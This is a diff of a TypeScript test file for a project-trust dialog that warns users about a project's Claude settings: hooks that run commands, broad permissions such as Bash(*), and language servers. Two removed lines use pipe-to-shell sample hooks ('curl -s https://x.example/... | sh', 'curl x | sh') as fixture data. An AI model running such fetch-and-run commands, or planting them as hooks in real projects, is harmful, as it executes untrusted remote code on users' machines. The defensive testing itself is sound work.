@@ -117,7 +117,7 @@ describe("config changes", () => {
       ),
     ).toEqual({
       broad: null,
-      code: 'Once you trust the changes, 1 new hook will run commands on your computer: "Stop: x".',
+      code: "Once you trust the changes, 1 new hook will run commands on your computer.",
       env: null,
       unreadable: null,
     });
@@ -141,29 +141,29 @@ describe("trust summary", () => {
     expect(changeSummary([])).toBe("");
   });
 
-  it("names broad rules and what runs code, as what trusting would do", () => {
+  it("counts broad rules and what runs code in plain words, as what trusting would do", () => {
     expect(warnings(items, "untrusted")).toEqual({
-      broad: "Once you trust this project, Claude will use Bash(*), Edit, Write and 1 more without asking you.",
-      code: 'Once you trust this project, 1 hook will run commands on your computer: "Stop: ./x.sh".',
+      broad:
+        "Once you trust this project, Claude will use 4 tools and commands without asking you, including any shell command.",
+      code: "Once you trust this project, 1 hook will run commands on your computer.",
       env: null,
       unreadable: null,
     });
     // Once trusted, it is what happens now.
     expect(warnings(items, "trusted")).toMatchObject({
-      broad: "Claude uses Bash(*), Edit, Write and 1 more without asking you.",
-      code: '1 hook runs commands on your computer: "Stop: ./x.sh".',
+      broad: "Claude uses 4 tools and commands without asking you, including any shell command.",
+      code: "1 hook runs commands on your computer.",
     });
+    // Raw rules stay in the lists; the warning counts them, the core's "… and N more" too.
+    const narrow = [{ path: "s.json", kind: "broad_allow_rules" as const, entries: ["Bash(make:*)", "… and 2 more"] }];
+    expect(warnings(narrow, "changed").broad).toBe(
+      "Once you trust the changes, Claude will use 3 new tools and commands without asking you.",
+    );
     const code = [
       { path: "s.json", kind: "hooks" as const, entries: ["a", "b"] },
       { path: "s.json", kind: "plugins" as const, entries: ["p"] },
     ];
-    // A plugin's name is not what it runs: nothing quoted.
     expect(warnings(code, "trusted").code).toBe("2 hooks and 1 plugin run commands on your computer.");
-    const long = `SessionStart: curl -s https://x.example/${"a".repeat(100)} | sh`;
-    const two = warnings([{ path: "s.json", kind: "hooks", entries: ["Stop: ./a.sh", long] }], "changed").code;
-    expect(two).toBe(
-      `Once you trust the changes, 2 new hooks will run commands on your computer: "Stop: ./a.sh" and "${long.slice(0, 79)}…".`,
-    );
     expect(warnings([{ path: "s.json", kind: "hooks", entries: ["a", "b", "c"] }], "trusted").code).toBe(
       "3 hooks run commands on your computer.",
     );
@@ -412,13 +412,12 @@ describe("ProjectTrust", () => {
     };
     const workspace = await show(core);
     expect(heading()).toBe("This project has its own Claude settings");
-    expect(testid("trust-summary")).toBe("2 broad permissions · 1 hook that runs code · 1 custom subagent");
+    // Plain lines only: no counts of every kind, no raw rules (those are in the lists).
+    expect(testid("trust-summary")).toBeNull();
     expect(testid("broad-rules")).toBe(
-      "⚠ Once you trust this project, Claude will use Bash(*) and Edit without asking you.",
+      "⚠ Once you trust this project, Claude will use 2 tools and commands without asking you, including any shell command.",
     );
-    expect(testid("trust-runs-code")).toBe(
-      '⚠ Once you trust this project, 1 hook will run commands on your computer: "PreToolUse (Bash): ./check.sh".',
-    );
+    expect(testid("trust-runs-code")).toBe("⚠ Once you trust this project, 1 hook will run commands on your computer.");
     // No sandbox here (the fake reports none): said before the Trust button, not only in the details.
     expect(testid("trust-no-sandbox")).toContain("without a sandbox");
     // The lists wait behind "Review and trust…"; Trust is only at their bottom.
@@ -444,19 +443,41 @@ describe("ProjectTrust", () => {
     await settle();
     expect(core.sent("projects.trust").map((c) => c.params)).toEqual([{ id: "p1", trusted: true, fingerprint: "f1" }]);
     expect(workspace.project?.trusted).toBe(true);
-    // Trusted: one quiet line with the warning count; the rest, and Stop trusting, under Details.
-    expect(heading()).toBe("Trusted project settings");
+    // Trusted: one quiet line with the warning count in its Details button; the rest under it.
+    expect(heading()).toBe("Project's own settings are on");
     expect(testid("trust-warning-count")).toBe("⚠ 2 warnings");
+    expect(trustCard()?.querySelector("[data-testid=trust-warning-count]")?.getAttribute("title")).toBe(
+      "2 warnings: see Details",
+    );
     expect(button(trustCard(), "Stop trusting")).toBeUndefined();
-    button(trustCard(), "Details")?.click();
+    const toggle = trustCard()?.querySelector<HTMLButtonElement>("[aria-controls=trust-body]");
+    expect(toggle?.textContent?.replace(/\s+/g, " ").trim()).toBe("⚠ 2 warnings Details");
+    toggle?.click();
     await settle();
-    expect(heading()).toBe("Project settings are on");
+    // Open, the same button in the same heading row folds it again; the warnings stay on the card.
+    expect(toggle?.textContent?.trim()).toBe("Hide");
+    expect(toggle?.getAttribute("aria-expanded")).toBe("true");
+    expect(toggle?.closest(".row")?.querySelector("h3")).not.toBeNull();
+    expect(testid("trust-runs-code")).toBe("⚠ 1 hook runs commands on your computer.");
+    // The lists wait one level deeper.
+    expect(testid("trust-details")).toBeNull();
+    button(trustCard(), "What's included")?.click();
+    await settle();
+    expect(testid("trust-details")).toContain("./check.sh");
+    // Trusted, nothing to decide: only the risky groups start open.
+    const open = [...(trustCard()?.querySelectorAll<HTMLDetailsElement>("details.group") ?? [])].map((g) => g.open);
+    expect(open).toEqual([true, true, false]);
+    toggle?.click();
+    await settle();
+    expect(testid("trust-warning-count")).toBe("⚠ 2 warnings");
+    toggle?.click();
+    await settle();
     button(trustCard(), "Stop trusting")?.click();
     await settle();
     expect(workspace.project?.trusted).toBe(false);
   });
 
-  it("shows the full lists by kind behind Show details, long ones cut", async () => {
+  it("shows the full lists by kind, counted, behind Review and trust, long ones cut", async () => {
     const core = new FakeAgentCore();
     const rules = Array.from({ length: 7 }, (_, n) => `mcp__xcode__tool${n}`);
     core.config = {
@@ -471,16 +492,18 @@ describe("ProjectTrust", () => {
     expect(toggle?.getAttribute("aria-expanded")).toBe("false");
     toggle?.click();
     flushSync();
-    expect(button(trustCard(), "Hide details")?.getAttribute("aria-expanded")).toBe("true");
+    expect(toggle?.getAttribute("aria-expanded")).toBe("true");
     const groups = [...(trustCard()?.querySelectorAll("details.group") ?? [])] as HTMLDetailsElement[];
+    // Deciding: every group is open, so Trust comes after all of it.
     expect(groups.map((g) => [g.dataset.kind, g.open])).toEqual([
       ["hooks", true],
-      ["allow_rules", false],
+      ["allow_rules", true],
     ]);
     expect(groups[0]?.textContent).toContain("runs code");
+    expect(groups.map((g) => g.querySelector(".count")?.textContent)).toEqual(["1", "7"]);
     expect(testid("trust-details")).toContain("./check.sh");
     expect(testid("trust-language-servers")).toMatch(
-      /Trusting also lets Ovra start language servers.*run the project's code.*Stop trusting stops them/s,
+      /Trusting also lets Ovra start language servers.*run the project's code.*Stop trusting stops them.*sessions started afterwards/s,
     );
     expect(groups[1]?.querySelectorAll("li")).toHaveLength(5);
     button(trustCard(), "+2 more")?.click();
@@ -525,7 +548,7 @@ describe("ProjectTrust", () => {
     expect(heading()).toBe("Project settings changed");
     expect(testid("trust-summary")).toBe("1 added, 1 removed");
     expect(testid("trust-runs-code")).toBe(
-      '⚠ Once you trust the changes, 1 new hook will run commands on your computer: "PreToolUse: curl x | sh".',
+      "⚠ Once you trust the changes, 1 new hook will run commands on your computer.",
     );
     button(trustCard(), "Review and trust…")?.click();
     flushSync();
@@ -545,7 +568,8 @@ describe("ProjectTrust", () => {
     button(trustCard(), "Trust the new settings")?.click();
     await settle();
     expect(core.sent("projects.trust").map((c) => c.params.fingerprint)).toEqual(["new", "newer"]);
-    expect(heading()).toBe("Trusted project settings");
+    expect(heading()).toBe("Project's own settings are on");
+    expect(testid("trust-details")).toBeNull();
   });
 
   it("rechecks when a session starts or the settings may have changed", async () => {
@@ -555,11 +579,11 @@ describe("ProjectTrust", () => {
     core.emit({ type: "review.changed", data: { project: "p1", id: "r1" } });
     await settle();
     expect(core.sent("agents.project_config")).toHaveLength(3);
-    // The summary is always shown, so an untrusted project's new settings come in too.
+    // The card is always shown, so an untrusted project's new settings come in too.
     core.config = { fingerprint: "f1", items: [{ path: ".claude/skills", kind: "skills", entries: ["a"] }] };
     core.emit({ type: "fs.changed", data: { project: "p1", paths: [".claude/skills/a/SKILL.md"] } });
     await settle();
-    expect(testid("trust-summary")).toBe("1 skill");
+    expect(heading()).toBe("This project has its own Claude settings");
   });
 
   it("ignores an answer that a later re-read overtook", async () => {
